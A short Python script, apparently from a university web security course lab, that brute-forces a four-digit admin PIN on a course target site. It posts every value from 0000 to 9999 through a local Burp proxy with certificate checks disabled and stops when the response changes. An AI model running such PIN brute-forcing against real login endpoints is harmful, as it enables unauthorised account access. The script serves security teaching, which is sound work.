#!/usr/bin/python3

# featherbear.cc/UNSW-COMP6443
# Proxied request template
# - Useful for sending requests through a proxy, like Burp Suite

import re
import urllib
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

proxy = {
    'https': 'http://127.0.0.1:8080',
    'http': 'http://127.0.0.1:8080'
}

params = {
        "pin": 0000
    }

response = requests.post("https://files.quoccabank.com/admin", proxies=proxy, data=urllib.parse.urlencode(params), verify=False, headers={
        "Content-Type": "application/x-www-form-urlencoded"
    })

for pin in range(0,10000):
    pin = '{0:04}'.format(pin)
    params = {
        "pin": pin
    }

    response1 = requests.post("https://files.quoccabank.com/admin", proxies=proxy, data=urllib.parse.urlencode(params), verify=False, headers={
        "Content-Type": "application/x-www-form-urlencoded"
    })

    if response.text != response1.text:
        print("Pin found:", pin)
        break
    else:
        print("Incorrect pin:", pin)